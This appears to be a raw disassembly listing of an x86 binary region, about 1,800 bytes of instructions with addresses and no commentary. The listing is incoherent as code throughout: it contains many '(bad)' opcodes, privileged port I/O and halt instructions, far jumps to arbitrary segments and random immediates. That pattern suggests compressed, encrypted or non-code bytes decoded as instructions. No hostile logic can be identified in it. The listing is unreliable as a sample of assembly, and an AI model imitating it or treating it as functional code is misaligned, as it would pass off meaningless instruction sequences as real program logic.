  41ea7e:	add    BYTE PTR [ebx+0x52],dl
  41ea81:	xor    eax,ebx
  41ea83:	out    0xa,eax
  41ea85:	xor    edi,DWORD PTR [esi]
  41ea87:	stc    
  41ea88:	das    
  41ea89:	and    ecx,DWORD PTR [eax-0x41]
  41ea8c:	mov    al,dh
  41ea8e:	inc    eax
  41ea8f:	pop    DWORD PTR [esi]
  41ea91:	jl     0x41ea8a
  41ea93:	push   edi
  41ea94:	jp     0x41ea98
  41ea96:	add    DWORD PTR [esi-0x26],esi
  41ea99:	mov    esp,0x5ea1a800
  41ea9e:	ins    BYTE PTR es:[edi],dx
  41ea9f:	ss sbb al,0xde
  41eaa2:	pusha  
  41eaa3:	mov    dl,BYTE PTR [edi-0x6d]
  41eaa6:	or     eax,0xd68f13cd
  41eaab:	pop    eax
  41eaac:	div    BYTE PTR [ecx+0x4f]
  41eaaf:	sub    DWORD PTR [edx-0x40f1db89],edx
  41eab5:	gs xchg edx,eax
  41eab7:	push   cs
  41eab8:	repz call DWORD PTR [esi+edi*1+0x41a97d65]
  41eac0:	inc    eax
  41eac1:	jecxz  0x41ea81
  41eac3:	mov    ds:0x67b387dd,eax
  41eac8:	push   esp
  41eac9:	int    0x66
  41eacb:	sar    DWORD PTR ss:[edi],cl
  41eace:	push   ebx
  41eacf:	sub    DWORD PTR [edi],0x44
  41ead2:	jle    0x41ea7a
  41ead4:	aad    0x15
  41ead6:	mov    esp,0x1f4da05d
  41eadb:	jmp    0x41eb5a
  41eadd:	mov    ah,0xfe
  41eadf:	push   es
  41eae0:	sbb    al,BYTE PTR [ebp+0x4641b40b]
  41eae6:	push   ecx
  41eae7:	or     BYTE PTR [esi+0x41],bl
  41eaea:	les    ebx,FWORD PTR [ebx+ebp*4+0x8]
  41eaee:	adc    al,BYTE PTR ds:0x3392f73f
  41eaf4:	loop   0x41ead6
  41eaf6:	add    al,0x1d
  41eaf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaf9:	inc    BYTE PTR [edi+ebx*4]
  41eafc:	or     DWORD PTR [eax+0x4a],ebx
  41eaff:	(bad)  
  41eb00:	xlat   BYTE PTR ds:[ebx]
  41eb01:	xor    BYTE PTR [edi],bl
  41eb03:	adc    BYTE PTR [edx-0x6f572dc0],0x7
  41eb0a:	pop    ecx
  41eb0b:	je     0x41eb2e
  41eb0d:	push   ss
  41eb0e:	mov    cl,0xea
  41eb10:	xchg   BYTE PTR [edi+0x19],bh
  41eb13:	(bad)  
  41eb14:	int    0xdd
  41eb16:	lods   eax,DWORD PTR ds:[esi]
  41eb17:	xor    bl,BYTE PTR [esp+edi*4-0x7670cd89]
  41eb1e:	push   ss
  41eb1f:	dec    ebp
  41eb20:	xor    eax,DWORD PTR [esp+esi*2]
  41eb23:	mov    ds:0xcbb0f4bc,eax
  41eb28:	sub    eax,0x6aec86ef
  41eb2d:	mov    eax,ds:0x54efadf0
  41eb32:	lods   al,BYTE PTR ds:[esi]
  41eb33:	dec    esp
  41eb34:	adc    dh,dh
  41eb36:	test   eax,0x1bd474b3
  41eb3b:	or     eax,DWORD PTR [ecx]
  41eb3d:	push   edx
  41eb3e:	rol    BYTE PTR ds:0xcd6ae445,1
  41eb44:	push   eax
  41eb45:	cli    
  41eb46:	jbe    0x41eb07
  41eb48:	dec    ebp
  41eb49:	and    ebp,DWORD PTR [eax-0x2d938602]
  41eb4f:	stos   BYTE PTR es:[edi],al
  41eb50:	jl     0x41eb6b
  41eb52:	pusha  
  41eb53:	adc    DWORD PTR [edx],esi
  41eb55:	dec    ebp
  41eb56:	fisttp QWORD PTR [ecx]
  41eb58:	out    dx,al
  41eb59:	mov    ds:0xedb4845,al
  41eb5e:	mov    bl,0x8e
  41eb60:	dec    edi
  41eb61:	test   eax,0x6f0b0f1d
  41eb66:	cmc    
  41eb67:	pop    edx
  41eb68:	lock xchg ebp,eax
  41eb6a:	sbb    BYTE PTR [edx-0x31],al
  41eb6d:	fiadd  DWORD PTR [esi]
  41eb6f:	jecxz  0x41ebd0
  41eb71:	mov    bh,0xef
  41eb73:	mov    ecx,0xa3d1ea4f
  41eb78:	mov    WORD PTR ds:0xd6076d52,ds
  41eb7e:	es and al,0x34
  41eb82:	push   edi
  41eb83:	xor    BYTE PTR [ecx+0x1380a486],bl
  41eb89:	bound  ecx,QWORD PTR [eax+0x4a5dd10]
  41eb8f:	pop    ecx
  41eb90:	or     al,0x13
  41eb92:	jno    0x41eb53
  41eb94:	lea    edx,[ebx]
  41eb96:	hlt    
  41eb97:	pop    es
  41eb98:	push   ebx
  41eb99:	xor    cl,BYTE PTR [ebx+0x5]
  41eb9c:	add    al,0x3d
  41eb9e:	daa    
  41eb9f:	loope  0x41eb79
  41eba1:	into   
  41eba2:	call   0x2f599590
  41eba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eba8:	sub    edx,DWORD PTR [edx+0x27cd2149]
  41ebae:	ins    BYTE PTR es:[edi],dx
  41ebaf:	mov    ch,0x3e
  41ebb1:	fidiv  DWORD PTR [ecx+0x7e739412]
  41ebb7:	push   DWORD PTR [edx-0x2d]
  41ebba:	or     bl,bh
  41ebbc:	mov    bh,0xec
  41ebbe:	je     0x41ebb5
  41ebc0:	xchg   BYTE PTR [edx-0x1116c250],bl
  41ebc6:	jmp    0x21074862
  41ebcb:	mov    ebx,DWORD PTR [esi]
  41ebcd:	sub    al,0xa
  41ebcf:	imul   DWORD PTR [ecx]
  41ebd1:	xor    al,0x73
  41ebd3:	sti    
  41ebd4:	scas   al,BYTE PTR es:[edi]
  41ebd5:	xor    al,0xef
  41ebd7:	imul   BYTE PTR [edx]
  41ebd9:	mov    WORD PTR [esi-0x1df990ff],cs
  41ebdf:	push   ecx
  41ebe0:	adc    eax,0x40a3b305
  41ebe5:	sbb    al,0x8
  41ebe7:	pop    ecx
  41ebe8:	xchg   esi,eax
  41ebe9:	push   ebp
  41ebea:	mov    edi,0x85fe2301
  41ebef:	push   es
  41ebf0:	pop    ebp
  41ebf1:	repnz dec ebp
  41ebf3:	add    eax,0x542df987
  41ebf8:	sbb    eax,0x70cd359c
  41ebfd:	scas   eax,DWORD PTR es:[edi]
  41ebfe:	jnp    0x41ebc1
  41ec00:	aaa    
  41ec01:	into   
  41ec02:	push   0x45
  41ec04:	lahf   
  41ec05:	dec    edx
  41ec06:	add    eax,0x4344dd1a
  41ec0b:	mov    bh,0x7b
  41ec0d:	pop    ebp
  41ec0e:	mov    ch,0xf3
  41ec10:	js     0x41ec90
  41ec12:	loop   0x41eb9a
  41ec14:	fisubr DWORD PTR [ebx+0xebc0821]
  41ec1a:	das    
  41ec1b:	pushf  
  41ec1c:	mov    cl,0x3c
  41ec1e:	cmp    al,0xd6
  41ec20:	js     0x41ec75
  41ec22:	loopne 0x41ebc0
  41ec24:	cmp    al,0xa1
  41ec26:	sbb    DWORD PTR [ebp+0x3e116085],edi
  41ec2c:	inc    ebp
  41ec2d:	and    eax,0x5ba41879
  41ec32:	and    cl,BYTE PTR [ecx]
  41ec34:	repnz es addr16 aaa 
  41ec38:	stos   DWORD PTR es:[edi],eax
  41ec39:	mov    WORD PTR [eax-0x4d67d3db],?
  41ec3f:	pop    esi
  41ec40:	fwait
  41ec41:	(bad)  
  41ec42:	cli    
  41ec43:	prefetch BYTE PTR [eax]
  41ec46:	rcl    BYTE PTR [ebx],cl
  41ec48:	in     al,0xd
  41ec4a:	xor    dh,dh
  41ec4c:	ret    0xab17
  41ec4f:	mov    edx,0xf454e40c
  41ec54:	jg     0x41ebd8
  41ec56:	fwait
  41ec57:	pop    ecx
  41ec58:	mov    ebx,ds
  41ec5a:	jg     0x41ecba
  41ec5c:	scas   eax,DWORD PTR es:[edi]
  41ec5d:	int3   
  41ec5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec60:	into   
  41ec61:	pop    esi
  41ec62:	jae    0x41ec3f
  41ec64:	and    esp,DWORD PTR gs:[edx-0x23]
  41ec68:	or     DWORD PTR [ebp+edi*4-0x19d898d],edi
  41ec6f:	sub    al,0x65
  41ec71:	ret    
  41ec72:	inc    ebx
  41ec73:	ret    
  41ec74:	sub    eax,0x94654a72
  41ec79:	add    ah,BYTE PTR [edx]
  41ec7b:	out    dx,eax
  41ec7c:	push   ecx
  41ec7d:	sub    al,0x75
  41ec7f:	xchg   BYTE PTR [ebx+0x5e],dh
  41ec82:	stos   BYTE PTR es:[edi],al
  41ec83:	in     eax,0x20
  41ec85:	call   0xab07:0x93a3cc32
  41ec8c:	pop    edi
  41ec8d:	pop    edx
  41ec8e:	cld    
  41ec8f:	or     BYTE PTR [edx-0x2d],al
  41ec92:	mov    edx,es
  41ec94:	pop    esp
  41ec95:	cmp    al,BYTE PTR [edi+0x15]
  41ec98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec99:	and    DWORD PTR [ebp-0x2f5f611d],esp
  41ec9f:	repz inc edi
  41eca1:	xchg   DWORD PTR [edx+edi*4-0x74],esi
  41eca5:	pop    ss
  41eca6:	arpl   si,bx
  41eca8:	xchg   esi,eax
  41eca9:	cmp    esp,edx
  41ecab:	jl     0x41ed26
  41ecad:	mov    ecx,0x7e05e121
  41ecb2:	je     0x41ed25
  41ecb4:	pop    ss
  41ecb5:	inc    esp
  41ecb6:	imul   edi,DWORD PTR [eax],0xffffffda
  41ecb9:	push   ebp
  41ecba:	push   edx
  41ecbb:	mov    esi,0xd59a6880
  41ecc0:	call   0x2f7f:0x71fac09b
  41ecc7:	mov    bh,bh
  41ecc9:	cwde   
  41ecca:	add    BYTE PTR gs:[ecx-0x67],cl
  41ecce:	call   0xca82833f
  41ecd3:	stc    
  41ecd4:	mov    ebp,0x42151ffd
  41ecd9:	rcl    BYTE PTR [ebp+0x56fae638],cl
  41ecdf:	push   es
  41ece0:	xor    al,0x57
  41ece2:	jmp    0x96e372b2
  41ece7:	shl    DWORD PTR [edi],0x5
  41ecea:	scas   eax,DWORD PTR es:[edi]
  41eceb:	add    DWORD PTR [edi+0x31],ecx
  41ecee:	dec    edx
  41ecef:	in     eax,dx
  41ecf0:	xor    al,0xd8
  41ecf2:	int3   
  41ecf3:	enter  0x1c03,0xc0
  41ecf7:	sbb    BYTE PTR [edi-0x6d],dh
  41ecfa:	ins    BYTE PTR es:[edi],dx
  41ecfb:	imul   edi,DWORD PTR [edi+0x7712fb4c],0x2c26ff9d
  41ed05:	add    dh,BYTE PTR [esi-0x3f]
  41ed08:	lods   eax,DWORD PTR ds:[esi]
  41ed09:	call   0xc575b55e
  41ed0e:	mov    al,ds:0xb426a267
  41ed13:	sbb    esp,DWORD PTR [ebp-0x59]
  41ed16:	jb     0x41ed72
  41ed18:	mov    ds:0x5638b480,eax
  41ed1d:	jo     0x41ed30
  41ed1f:	loopne 0x41ed5b
  41ed21:	clc    
  41ed22:	out    0x88,al
  41ed24:	xchg   ebp,eax
  41ed25:	rcr    edx,1
  41ed27:	push   ds
  41ed28:	xor    ebx,ebp
  41ed2a:	add    dh,ah
  41ed2c:	inc    ebx
  41ed2d:	jo     0x4585e3bf
  41ed33:	jno    0x41ed9f
  41ed35:	xor    ch,BYTE PTR [edx]
  41ed37:	das    
  41ed38:	xchg   ebp,eax
  41ed39:	test   eax,0x9017f9f6
  41ed3e:	push   esp
  41ed3f:	icebp  
  41ed40:	dec    ebx
  41ed41:	jg     0x41eda8
  41ed43:	lods   al,BYTE PTR ds:[esi]
  41ed44:	not    BYTE PTR ds:0x765f7029
  41ed4a:	arpl   di,cx
  41ed4c:	nop
  41ed4d:	mov    cl,0x4a
  41ed4f:	mov    edi,eax
  41ed51:	mov    ?,WORD PTR [ecx]
  41ed53:	aaa    
  41ed54:	fist   DWORD PTR [eax+0x776c531a]
  41ed5a:	outs   dx,BYTE PTR ds:[esi]
  41ed5b:	ret    0xfdec
  41ed5e:	add    ch,BYTE PTR [esi]
  41ed60:	rcl    ebx,1
  41ed62:	(bad)
  41ed67:	and    edi,ebx
  41ed69:	mov    ecx,0xeb6955d2
  41ed6e:	in     eax,0x5a
  41ed70:	test   BYTE PTR ds:0xfa374c96,dl
  41ed76:	cmp    eax,0x2b80295e
  41ed7b:	cmp    BYTE PTR [edi],dh
  41ed7d:	sbb    dh,cl
  41ed7f:	xor    al,0x2d
  41ed81:	jmp    0x70fa:0x32f42634
  41ed88:	pop    eax
  41ed89:	mov    ebp,0x8f8ad11f
  41ed8e:	cmp    bh,bl
  41ed90:	fldenv [edi+0x39]
  41ed93:	push   ebp
  41ed94:	cmp    DWORD PTR [edx+ecx*8+0x2c8c886c],esp
  41ed9b:	xchg   BYTE PTR [ecx-0x76],ah
  41ed9e:	pop    ebx
  41ed9f:	dec    esi
  41eda0:	and    esi,DWORD PTR [edi+0x14ec415]
  41eda6:	data16 shl BYTE PTR [edi-0x60d0f877],cl
  41edad:	pop    ebx
  41edae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edb0:	cmp    BYTE PTR [edi],al
  41edb2:	adc    edi,eax
  41edb4:	js     0x41ede0
  41edb6:	outs   dx,DWORD PTR ds:[esi]
  41edb7:	lea    ebp,[edi-0x4e3b7649]
  41edbd:	ds jns 0x41edf6
  41edc0:	loop   0x41ee3b
  41edc2:	test   BYTE PTR [edx-0x6b],0x92
  41edc6:	jecxz  0x41ee13
  41edc8:	sar    BYTE PTR [ebx+0x3564c061],1
  41edce:	aaa    
  41edcf:	out    dx,eax
  41edd0:	lahf   
  41edd1:	or     DWORD PTR [edi+0x60],ebp
  41edd4:	add    eax,0x3c816a81
  41edd9:	or     DWORD PTR [ebp+ebx*1+0x2d],0x63e6c079
  41ede1:	pop    ebp
  41ede2:	sbb    edi,DWORD PTR [ecx+0x66222910]
  41ede8:	push   ecx
  41ede9:	cli    
  41edea:	(bad)  
  41edeb:	imul   esi,DWORD PTR [edi+0x79261337],0xa87e8c05
  41edf5:	or     eax,0x5e5b29f1
  41edfa:	repz cli 
  41edfc:	test   DWORD PTR [ebp+0x8],esi
  41edff:	lea    edi,[eax]
  41ee01:	aad    0xa6
  41ee03:	jns    0x41ee10
  41ee05:	or     BYTE PTR [eax],al
  41ee07:	sbb    ebx,edx
  41ee09:	pop    ds
  41ee0a:	push   ebp
  41ee0b:	push   eax
  41ee0c:	and    DWORD PTR [edi+0x50],0x779d4134
  41ee13:	inc    ecx
  41ee14:	mov    fs,WORD PTR [eax-0x6f]
  41ee17:	xchg   edi,eax
  41ee18:	adc    eax,0x8990b597
  41ee1d:	ja     0x41ee32
  41ee1f:	stos   DWORD PTR es:[edi],eax
  41ee20:	xchg   edi,eax
  41ee21:	or     dl,BYTE PTR [esi-0x2d]
  41ee24:	rol    DWORD PTR [ebx],cl
  41ee26:	mov    esi,0xfe364e4e
  41ee2b:	xchg   edi,eax
  41ee2c:	inc    edi
  41ee2d:	or     eax,0x99e4b6bc
  41ee32:	pop    edi
  41ee33:	push   ds
  41ee34:	out    dx,eax
  41ee35:	xchg   edi,eax
  41ee36:	add    eax,0xdb3e249d
  41ee3b:	sahf   
  41ee3c:	jle    0x41edf7
  41ee3e:	iret   
  41ee3f:	scas   eax,DWORD PTR es:[edi]
  41ee40:	pop    edx
  41ee41:	lods   eax,DWORD PTR ds:[esi]
  41ee42:	jne    0x41edf9
  41ee44:	dec    edx
  41ee45:	out    dx,eax
  41ee46:	nop
  41ee47:	loopne 0x41ee47
  41ee49:	xor    edi,DWORD PTR [esp+edx*8+0x5a74876a]
  41ee50:	ss xchg esp,eax
  41ee52:	out    dx,eax
  41ee53:	ret    0x573
  41ee56:	pop    eax
  41ee57:	outs   dx,BYTE PTR ds:[esi]
  41ee58:	jg     0x41ee0a
  41ee5a:	mov    eax,ds:0x236e397b
  41ee5f:	mov    cl,0x46
  41ee61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee62:	xor    DWORD PTR [ecx+0x78],0xffffffc1
  41ee66:	inc    ecx
  41ee67:	sub    bh,bh
  41ee69:	in     eax,0x9b
  41ee6b:	(bad)  
  41ee6c:	leave  
  41ee6d:	and    esi,edi
  41ee6f:	and    esi,DWORD PTR [eax-0x33]
  41ee72:	out    dx,eax
  41ee73:	jnp    0x41ee55
  41ee75:	jecxz  0x41ee55
  41ee77:	adc    DWORD PTR [edi],ecx
  41ee79:	add    eax,0x33b9fef5
  41ee7e:	shl    al,0xc
  41ee81:	lods   al,BYTE PTR ds:[esi]
  41ee82:	imul   edi,DWORD PTR [ebp-0x58],0xe0cfad6a
  41ee89:	(bad)  
  41ee8a:	dec    edx
  41ee8b:	push   0xcbb61f90
  41ee90:	adc    DWORD PTR [ebx-0x6f],edx
  41ee93:	xchg   ecx,eax
  41ee94:	lock fs lock hlt 
  41ee98:	xchg   edx,eax
  41ee99:	repz aam 0x5d
  41ee9c:	call   0xe178426f
  41eea1:	out    dx,al
  41eea2:	idiv   DWORD PTR [ebx]
  41eea4:	hlt    
  41eea5:	fist   DWORD PTR [edi-0x73b00e7]
  41eeab:	gs ins DWORD PTR es:[edi],dx
  41eead:	lods   al,BYTE PTR ds:[esi]
  41eeae:	test   eax,0x219dd2c2
  41eeb3:	in     eax,dx
  41eeb4:	dec    esi
  41eeb5:	xchg   BYTE PTR [edx],cl
  41eeb7:	pop    esp
  41eeb8:	push   esp
  41eeb9:	xchg   ecx,eax
  41eeba:	pop    eax
  41eebb:	int    0xe8
  41eebd:	imul   edx,DWORD PTR [esi],0x4b
  41eec0:	add    al,bh
  41eec2:	fnsave [eax+eax*1+0xf]
  41eec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec7:	das    
  41eec8:	add    dl,al
  41eeca:	fldenv [esi+ebp*8+0x32c5bd9e]
  41eed1:	fisub  WORD PTR [edi+edx*2+0x6c94ad34]
  41eed8:	ins    DWORD PTR es:[edi],dx
  41eed9:	add    al,0xfe
  41eedb:	out    0x7d,al
  41eedd:	sub    eax,0xec834e14
  41eee2:	push   ss
  41eee3:	mov    cl,0x29
  41eee5:	addr16 cld 
  41eee7:	jb     0x41eec5
  41eee9:	loopne 0x41ee80
  41eeeb:	sbb    esp,DWORD PTR [esi+0x379308a4]
  41eef1:	ins    DWORD PTR es:[edi],dx
  41eef2:	repz mov bh,0x7e
  41eef5:	or     al,0x21
  41eef7:	xchg   BYTE PTR [ecx+eax*2-0x1d],bh
  41eefb:	(bad)  
  41eefc:	mov    ds:0x81a2582e,eax
  41ef01:	push   ebx
  41ef02:	inc    esi
  41ef03:	outs   dx,BYTE PTR ds:[esi]
  41ef04:	cmp    bl,BYTE PTR [eax]
  41ef06:	jno    0x41ef73
  41ef08:	andps  xmm7,XMMWORD PTR [eax+0x5ad593d0]
  41ef0f:	inc    esi
  41ef10:	mov    al,ds:0xa50b811
  41ef15:	pusha  
  41ef16:	mov    dl,BYTE PTR [ebp+eax*2-0x67]
  41ef1a:	addr16 xchg edi,eax
  41ef1c:	(bad)  
  41ef1e:	ja     0x41ef7a
  41ef20:	into   
  41ef21:	jns    0x41ef66
  41ef23:	cmp    DWORD PTR [ecx+0x75],eax
  41ef26:	(bad)  
  41ef27:	shr    DWORD PTR [ebx+eax*8+0x7c7d6b84],0xe9
  41ef2f:	dec    ebx
  41ef30:	jo     0x41eee9
  41ef32:	stc    
  41ef33:	lods   al,BYTE PTR ds:[esi]
  41ef34:	das    
  41ef35:	adc    esp,eax
  41ef37:	push   esp
  41ef38:	dec    ebp
  41ef39:	push   edi
  41ef3a:	pop    ebp
  41ef3b:	pop    ebp
  41ef3c:	pop    ecx
  41ef3d:	retf   0xb1d2
  41ef40:	sbb    eax,0x39166f1f
  41ef45:	std    
  41ef46:	push   ebp
  41ef47:	enter  0x4c0b,0x3f
  41ef4b:	into   
  41ef4c:	push   ebx
  41ef4d:	(bad)  
  41ef4e:	mov    ds:0x14637b67,al
  41ef53:	out    dx,al
  41ef54:	leave  
  41ef55:	push   ebp
  41ef56:	xchg   esp,eax
  41ef57:	dec    esp
  41ef58:	or     BYTE PTR [eax],ch
  41ef5a:	fimul  WORD PTR [eax-0x33]
  41ef5d:	add    ebp,eax
  41ef5f:	adc    al,0xb0
  41ef61:	(bad)  
  41ef62:	cmp    dl,BYTE PTR [edx]
  41ef64:	pop    es
  41ef65:	(bad)  
  41ef67:	xchg   edi,eax
  41ef68:	sbb    al,0x5c
  41ef6a:	inc    ecx
  41ef6b:	inc    bh
  41ef6d:	pop    eax
  41ef6e:	into   
  41ef6f:	adc    al,0x9c
  41ef71:	sbb    al,0xe
  41ef73:	hlt    
  41ef74:	mov    edi,edi
  41ef76:	xor    DWORD PTR [edx+0x4b],esi
  41ef79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef7a:	mov    bh,0xd4
  41ef7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef7d:	xlat   BYTE PTR ds:[ebx]
  41ef7e:	xchg   edi,eax
  41ef7f:	jl     0x41ef9b
  41ef81:	stc    
  41ef82:	push   eax
  41ef83:	add    ebx,edx
  41ef85:	mov    ds:0x1fd8a288,al
  41ef8a:	scas   al,BYTE PTR es:[edi]
  41ef8b:	fptan  
  41ef8d:	dec    ecx
  41ef8e:	imul   esi
  41ef90:	and    al,0xa8
  41ef92:	mov    eax,0x1a49162f
  41ef97:	xor    edi,DWORD PTR ss:[esp+ebx*1]
  41ef9b:	(bad)  
  41ef9e:	int    0xdc
  41efa0:	xchg   edi,eax
  41efa1:	xchg   esi,eax
  41efa2:	into   
  41efa3:	call   0x1e857284
  41efa8:	imul   eax,DWORD PTR [eax+0x1b],0x1a
  41efac:	fcmovnu st,st(6)
  41efae:	adc    ecx,edx
  41efb0:	in     al,dx
  41efb1:	outs   dx,DWORD PTR ds:[esi]
  41efb2:	lods   eax,DWORD PTR ds:[esi]
  41efb3:	sbb    ch,BYTE PTR [eax+eax*1+0x4e]
  41efb7:	and    bh,BYTE PTR ss:[esi]
  41efba:	push   ds
  41efbb:	dec    esi
  41efbc:	xchg   ecx,eax
  41efbd:	(bad)  [edi-0x1d30f007]
  41efc3:	and    eax,0x3c20b494
  41efc8:	scas   eax,DWORD PTR es:[edi]
  41efc9:	inc    eax
  41efca:	pop    ss
  41efcb:	hlt    
  41efcc:	mov    ebx,ebp
  41efce:	sub    ecx,edi
  41efd0:	outs   dx,BYTE PTR ds:[esi]
  41efd1:	ret    0xb0e3
  41efd4:	xor    edi,DWORD PTR [esi-0x229f31c3]
  41efda:	fld    DWORD PTR [esi+0x6f]
  41efdd:	jecxz  0x41effe
  41efdf:	push   ss
  41efe0:	retf   0xfddf
  41efe3:	mov    esp,0x1b8a146c
  41efe8:	call   0xe99375b8
  41efed:	jge    0x41f00c
  41efef:	popa   
  41eff0:	call   DWORD PTR [ecx+edi*8+0x2e7af89f]
  41eff7:	push   ebp
  41eff8:	into   
  41eff9:	mov    ebp,0xfa1de540
  41effe:	jbe    0x41eff4
  41f000:	daa    
  41f001:	adc    ebx,DWORD PTR [ebx+0x3f4468ea]
  41f007:	push   esi
  41f008:	jp     0x41efb5
  41f00a:	add    BYTE PTR [esi],ch
  41f00c:	push   es
  41f00d:	or     ebx,DWORD PTR [edi+eax*2+0x11]
  41f011:	in     eax,0x19
  41f013:	jge    0x41f059
  41f015:	xchg   esi,eax
  41f016:	sbb    BYTE PTR [edx+0x6eae1118],bh
  41f01c:	mov    esi,0xbf82c2ad
  41f021:	lods   al,BYTE PTR ds:[esi]
  41f022:	pop    edi
  41f023:	out    dx,eax
  41f024:	and    edi,DWORD PTR [ebx-0x27fd239]
  41f02a:	push   ds
  41f02b:	jno    0x41eff0
  41f02d:	gs repz or BYTE PTR ds:[edx-0x1530eff8],bl
  41f036:	js     0x41f07a
  41f038:	scas   eax,DWORD PTR es:[edi]
  41f039:	sbb    edi,esi
  41f03b:	ret    0xcf1
  41f03e:	(bad)  
  41f03f:	cli    
  41f040:	pop    es
  41f041:	sub    ecx,DWORD PTR [esi]
  41f043:	sub    BYTE PTR [ebx],0x8
  41f046:	inc    esp
  41f047:	xor    edi,DWORD PTR [edx+0x64bcbf87]
  41f04d:	xor    eax,0xd45df730
  41f052:	lods   al,BYTE PTR ds:[esi]
  41f053:	mov    dh,0xc0
  41f055:	mov    ebp,0xf4b18573
  41f05a:	xchg   ecx,eax
  41f05b:	xchg   ebp,eax
  41f05c:	sub    DWORD PTR [edx+ebp*2],ebx
  41f05f:	adc    dh,BYTE PTR [edi]
  41f061:	retf   
  41f062:	fnstcw WORD PTR [eax+0x51]
  41f065:	push   edi
  41f066:	mov    ebx,0x2e317a37
  41f06b:	jmp    0xfa26231e
  41f070:	inc    ebx
  41f071:	pop    es
  41f072:	fdiv   st(4),st
  41f074:	adc    dh,BYTE PTR [eax+ecx*4-0x2cb8399c]
  41f07b:	sub    BYTE PTR [eax],0x8c
  41f07e:	(bad)  [ebp-0x2a]
  41f081:	push   esp
  41f082:	into   
  41f083:	pop    edx
  41f084:	jge    0x41f0a3
  41f086:	mov    edx,DWORD PTR [ecx+esi*2+0x2e]
  41f08a:	aad    0x61
  41f08c:	mov    ds:0xd452b654,eax
  41f091:	cdq    
  41f092:	push   edi
  41f093:	mov    dl,BYTE PTR [eax-0xfe59221]
  41f099:	mov    dh,0x8e
  41f09b:	xchg   DWORD PTR [ebx-0x602c689a],edi
  41f0a1:	iret   
  41f0a2:	cmp    al,bl
  41f0a4:	sbb    edi,esp
  41f0a6:	pop    ss
  41f0a7:	add    ecx,esp
  41f0a9:	into   
  41f0aa:	inc    esp
  41f0ab:	das    
  41f0ac:	sahf   
  41f0ad:	inc    ecx
  41f0ae:	loop   0x41f12f
  41f0b0:	bswap  edx
  41f0b2:	aaa    
  41f0b3:	add    eax,0xde601415
  41f0b8:	out    0xe5,al
  41f0ba:	jmp    0x570f:0x25bfdce1
  41f0c1:	push   esp
  41f0c2:	bound  ecx,QWORD PTR [ebx+edx*4+0xfb8c829]
  41f0c9:	loope  0x41f0fa
  41f0cb:	or     edi,DWORD PTR [esi-0x66]
  41f0ce:	adc    eax,0x9915446d
  41f0d3:	(bad)  
  41f0d4:	(bad)  
  41f0d6:	push   edi
  41f0d7:	jle    0x41f0da
  41f0d9:	loop   0x41f05d
  41f0db:	in     al,dx
  41f0dc:	pusha  
  41f0dd:	mov    bl,0x58
  41f0df:	mov    WORD PTR [ebx],?
  41f0e1:	mov    ecx,0x8553a039
  41f0e6:	hlt    
  41f0e7:	cmp    al,0xd7
  41f0e9:	fwait
  41f0ea:	out    dx,al
  41f0eb:	lods   al,BYTE PTR ds:[esi]
  41f0ec:	sub    DWORD PTR [ebx],esi
  41f0ee:	mov    dl,0xb0
  41f0f0:	inc    esi
  41f0f1:	jmp    0x79:0xfdd2a2ca
  41f0f8:	xchg   BYTE PTR [esi-0x57],ch
  41f0fb:	xor    ch,dh
  41f0fd:	sahf   
  41f0fe:	mov    esp,0x71ab521a
  41f103:	and    al,0xc2
  41f105:	cli    
  41f106:	mov    edx,0x11ece572
  41f10b:	in     al,0xf6
  41f10d:	sub    edx,DWORD PTR [ecx+0x3e04deaf]
  41f113:	push   esi
  41f114:	popa   
  41f115:	jge    0x41f13f
  41f117:	adc    BYTE PTR [ebx+0x30],bh
  41f11a:	xor    al,0x9b
  41f11c:	lods   al,BYTE PTR ds:[esi]
  41f11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f11e:	lods   al,BYTE PTR ds:[esi]
  41f11f:	mov    eax,0x888fe450
  41f124:	aam    0x1e
  41f126:	inc    ecx
  41f127:	jno    0x41f107
  41f129:	lods   eax,DWORD PTR ds:[esi]
  41f12a:	push   ds
  41f12b:	push   edx
  41f12c:	mov    bl,0x83
  41f12e:	lea    ecx,[edx]
  41f130:	pop    esi
  41f131:	loopne 0x41f0df
  41f133:	sbb    BYTE PTR [esp+ebp*1-0x2eedb646],bl
  41f13a:	mov    esi,ebp
  41f13c:	mov    DWORD PTR [edi+edi*8-0x23],eax
  41f140:	call   0xfc5adb38
  41f145:	in     al,dx
  41f146:	(bad)  
  41f147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f148:	mov    eax,0xa7eac4dd
  41f14d:	add    DWORD PTR [eax+0x40952d90],0x136e0708
  41f157:	sub    ch,BYTE PTR [ebp+0x233e9f3e]
  41f15d:	jnp    0x41f1d8
  41f15f:	neg    BYTE PTR [eax+0x6638bec1]
  41f165:	ds (bad) 
  41f167:	rol    ebp,cl
  41f169:	loope  0x41f189
  41f16b:	xor    eax,0x56008f70
  41f170:	cmp    ebp,DWORD PTR [ecx+0xf]
  41f173:	add    esp,DWORD PTR [ebx+esi*8-0x55a0691c]
  41f17a:	sub    DWORD PTR ds:0x96d7cdf2,ebp
  41f180:	xchg   esp,eax
  41f181:	mov    ebx,cs
  41f183:	xor    BYTE PTR [ecx-0xd19d15d],0xe9
  41f18a:	dec    esp
  41f18b:	mov    cl,0xa8
  41f18d:	push   0x67
  41f18f:	fwait
  41f190:	test   DWORD PTR [ebx-0x1e],esi
  41f193:	not    DWORD PTR [edi]
  41f195:	xlat   BYTE PTR ds:[ebx]
  41f196:	nop
  41f197:	adc    eax,0x166a301f
  41f19c:	xchg   ecx,eax
  41f19d:	cmp    eax,0xc2387adc
  41f1a2:	out    0xab,al
  41f1a4:	scas   eax,DWORD PTR es:[edi]
  41f1a5:	xor    al,0x29
  41f1a7:	mov    dh,0xb0
  41f1a9:	sahf   
  41f1aa:	jno    0x41f1da
  41f1ac:	and    BYTE PTR [edi-0x490dc1b],al
  41f1b2:	mov    ebx,0x74099d3f
